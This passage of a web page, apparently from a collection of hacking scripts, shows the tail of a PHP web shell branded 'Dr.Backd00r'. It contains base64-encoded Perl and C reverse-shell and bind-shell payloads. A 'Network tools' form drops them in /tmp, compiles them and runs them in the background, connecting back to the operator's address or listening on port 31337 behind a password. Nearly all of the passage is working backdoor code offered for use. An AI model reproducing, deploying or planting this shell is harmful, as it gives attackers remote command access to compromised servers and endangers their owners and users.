<span class="lineno">1359</span>     <span class="nv">$back_connect_p</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7&quot;</span><span class="p">;</span> 
<span class="lineno">1360</span>     <span class="nv">$bind_port_c</span><span class="o">=</span><span class="s2">&quot;I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9&quot;</span><span class="p">;</span> 
<span class="lineno">1361</span>     <span class="nv">$bind_port_p</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=&quot;</span><span class="p">;</span> 
<span class="lineno">1362</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno">1363</span> <span class="x">    &lt;h1&gt;Network tools&lt;/h1&gt;&lt;div class=content&gt; </span>
<span class="lineno">1364</span> <span class="x">    &lt;form name=&#39;nfp&#39; onSubmit=&quot;g(null,null,this.using.value,this.port.value,this.pass.value);return false;&quot;&gt; </span>
<span class="lineno">1365</span> <span class="x">    &lt;span&gt;Bind port to /bin/sh&lt;/span&gt;&lt;br/&gt; </span>
<span class="lineno">1366</span> <span class="x">    Port: &lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;31337&#39;&gt; Password: &lt;input type=&#39;text&#39; name=&#39;pass&#39; value=&#39;wso&#39;&gt; Using: &lt;select name=&quot;using&quot;&gt;&lt;option value=&#39;bpc&#39;&gt;C&lt;/option&gt;&lt;option value=&#39;bpp&#39;&gt;Perl&lt;/option&gt;&lt;/select&gt; &lt;input type=submit value=&quot;&gt;&gt;&quot;&gt; </span>
<span class="lineno">1367</span> <span class="x">    &lt;/form&gt; </span>
<span class="lineno">1368</span> <span class="x">    &lt;form name=&#39;nfp&#39; onSubmit=&quot;g(null,null,this.using.value,this.server.value,this.port.value);return false;&quot;&gt; </span>
<span class="lineno">1369</span> <span class="x">    &lt;span&gt;Back-connect to&lt;/span&gt;&lt;br/&gt; </span>
<span class="lineno">1370</span> <span class="x">    Server: &lt;input type=&#39;text&#39; name=&#39;server&#39; value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; Port: &lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;31337&#39;&gt; Using: &lt;select name=&quot;using&quot;&gt;&lt;option value=&#39;bcc&#39;&gt;C&lt;/option&gt;&lt;option value=&#39;bcp&#39;&gt;Perl&lt;/option&gt;&lt;/select&gt; &lt;input type=submit value=&quot;&gt;&gt;&quot;&gt; </span>
<span class="lineno">1371</span> <span class="x">    &lt;/form&gt;&lt;br&gt; </span>
<span class="lineno">1372</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno">1373</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno">1374</span>         <span class="k">function</span> <span class="nf">cf</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1375</span>             <span class="nv">$w</span><span class="o">=@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="o">@</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;file_put_contents&#39;</span><span class="p">);</span> 
<span class="lineno">1376</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1377</span>                 <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$t</span><span class="p">))</span> <span class="k">or</span> <span class="o">@</span><span class="nb">fputs</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$t</span><span class="p">))</span> <span class="k">or</span> <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$t</span><span class="p">));</span> 
<span class="lineno">1378</span>                 <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$w</span><span class="p">);</span> 
<span class="lineno">1379</span>             <span class="p">}</span> 
<span class="lineno">1380</span>         <span class="p">}</span> 
<span class="lineno">1381</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bpc&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1382</span>             <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.c&quot;</span><span class="p">,</span><span class="nv">$bind_port_c</span><span class="p">);</span> 
<span class="lineno">1383</span>             <span class="nv">$out</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;gcc -o /tmp/bp /tmp/bp.c&quot;</span><span class="p">);</span> 
<span class="lineno">1384</span>             <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.c&quot;</span><span class="p">);</span> 
<span class="lineno">1385</span>             <span class="nv">$out</span> <span class="o">.=</span> <span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;/tmp/bp &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span> 
<span class="lineno">1386</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=ml1&gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bp&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1387</span>         <span class="p">}</span> 
<span class="lineno">1388</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bpp&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1389</span>             <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.pl&quot;</span><span class="p">,</span><span class="nv">$bind_port_p</span><span class="p">);</span> 
<span class="lineno">1390</span>             <span class="nv">$out</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="s2">&quot;perl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; /tmp/bp.pl &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span> 
<span class="lineno">1391</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=ml1&gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bp.pl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1392</span>         <span class="p">}</span> 
<span class="lineno">1393</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bcc&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1394</span>             <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.c&quot;</span><span class="p">,</span><span class="nv">$back_connect_c</span><span class="p">);</span> 
<span class="lineno">1395</span>             <span class="nv">$out</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;gcc -o /tmp/bc /tmp/bc.c&quot;</span><span class="p">);</span> 
<span class="lineno">1396</span>             <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.c&quot;</span><span class="p">);</span> 
<span class="lineno">1397</span>             <span class="nv">$out</span> <span class="o">.=</span> <span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;/tmp/bc &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span> 
<span class="lineno">1398</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=ml1&gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1399</span>         <span class="p">}</span> 
<span class="lineno">1400</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bcp&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1401</span>             <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.pl&quot;</span><span class="p">,</span><span class="nv">$back_connect_p</span><span class="p">);</span> 
<span class="lineno">1402</span>             <span class="nv">$out</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="s2">&quot;perl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; /tmp/bc.pl &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span> 
<span class="lineno">1403</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=ml1&gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bc.pl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1404</span>         <span class="p">}</span> 
<span class="lineno">1405</span>     <span class="p">}</span> 
<span class="lineno">1406</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1407</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno">1408</span> <span class="p">}</span> 
<span class="lineno">1409</span> <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="p">)</span> 
<span class="lineno">1410</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$default_action</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$default_action</span><span class="p">))</span> 
<span class="lineno">1411</span>         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$default_action</span><span class="p">;</span> 
<span class="lineno">1412</span>     <span class="k">else</span> 
<span class="lineno">1413</span>         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SecInfo&#39;</span><span class="p">;</span> 
<span class="lineno">1414</span> <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="p">)</span> 
<span class="lineno">1415</span>     <span class="nb">call_user_func</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span> 
<span class="lineno">1416</span> <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno">1417</span> <span class="x">&lt;div id=&quot;cot_tl_fixed&quot;&gt;&lt;marquee&gt;Shell - *Dr.Backd00r*  - SubhashDasyam.com&lt;/marquee&gt;&lt;/div&gt; </span>
<span class="lineno">1418</span> <span class="x"> &lt;/marquee&gt;&lt;/div&gt;</span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
